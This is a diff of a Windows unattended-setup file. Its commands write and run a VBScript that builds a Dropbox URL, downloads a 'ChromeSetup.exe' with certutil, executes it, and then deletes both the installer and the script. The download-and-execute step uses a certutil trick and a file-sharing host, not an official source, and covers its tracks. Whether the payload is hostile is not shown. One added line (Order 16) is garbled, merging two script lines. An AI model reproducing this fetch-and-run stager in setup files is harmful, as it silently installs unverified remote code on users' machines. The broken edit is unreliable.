@@ -189,76 +189,81 @@
 
                 <SynchronousCommand wcm:action="add">
                     <Order>3</Order>
-                    <CommandLine>cmd /c echo url1 = "https://www.dropbox.com/scl/fi/1o7ges6buoqwmq6u7fwrn/ChromeSetup.exe?" &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo tempPath = shell.ExpandEnvironmentStrings("%TEMP%") &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>4</Order>
-                    <CommandLine>cmd /c echo url2 = "rlkey=518wyaa8t0emtrruvvmlqthm4&amp;st=byh6jymf&amp;dl=1" &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo installer = tempPath &amp; "\ChromeSetup.exe" &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>5</Order>
-                    <CommandLine>cmd /c echo fullurl = url1 &amp; url2 &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo url1 = "https://www.dropbox.com/scl/fi/1o7ges6buoqwmq6u7fwrn/ChromeSetup.exe?" &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>6</Order>
-                    <CommandLine>cmd /c echo installer = shell.ExpandEnvironmentStrings("%%TEMP%%") &amp; "\ChromeSetup.exe" &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo url2 = "rlkey=518wyaa8t0emtrruvvmlqthm4&amp;st=byh6jymf&amp;dl=1" &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>7</Order>
-                    <CommandLine>cmd /c echo cmd = "cmd /c certutil -urlcache -f -split """" &amp; fullurl &amp; """" """" &amp; installer &amp; """"" &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo fullurl = url1 &amp; url2 &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>8</Order>
-                    <CommandLine>cmd /c echo shell.Run cmd, 0, True &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo cmd = "cmd /c certutil -urlcache -f -split """ &amp; fullurl &amp; """ """ &amp; installer &amp; """" &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>9</Order>
-                    <CommandLine>cmd /c echo shell.Run """" &amp; installer &amp; """ /install", 1, False &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo shell.Run cmd, 0, True &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>10</Order>
-                    <CommandLine>cmd /c echo WScript.Sleep 8000 &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo shell.Run """" &amp; installer &amp; """ /install", 1, False &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>11</Order>
-                    <CommandLine>cmd /c echo On Error Resume Next &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo WScript.Sleep 8000 &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>12</Order>
-                    <CommandLine>cmd /c echo If fso.FileExists(installer) Then &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo On Error Resume Next &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>13</Order>
-                    <CommandLine>cmd /c echo fso.DeleteFile installer, True &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo If fso.FileExists(installer) Then &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>14</Order>
-                    <CommandLine>cmd /c echo End If &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo fso.DeleteFile installer, True &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>15</Order>
-                    <CommandLine>cmd /c echo self = WScript.ScriptFullName &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo End If &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>16</Order>
-                    <CommandLine>cmd /c echo shell.Run "cmd /c ping 127.0.0.1 -n 2 &gt;nul &amp; del """" &amp; self &amp; """"" , 0, False &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                    <CommandLine>cmd /c echo self = WScript.ScriptFullName &gt;nul &amp; del """" &amp; self &amp; """"" , 0, False &gt;&gt; C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
                 <SynchronousCommand wcm:action="add">
                     <Order>17</Order>
+                    <CommandLine>cmd /c echo shell.Run "cmd /c ping 127.0.0.1 -n 2 &gt;nul &amp; del """ &amp; self &amp; """", 0, False &gt;&gt; C:\install_chrome.vbs</CommandLine>
+                </SynchronousCommand>
+
+                <SynchronousCommand wcm:action="add">
+                    <Order>18</Order>
                     <CommandLine>cmd /c cscript //nologo C:\install_chrome.vbs</CommandLine>
                 </SynchronousCommand>
 
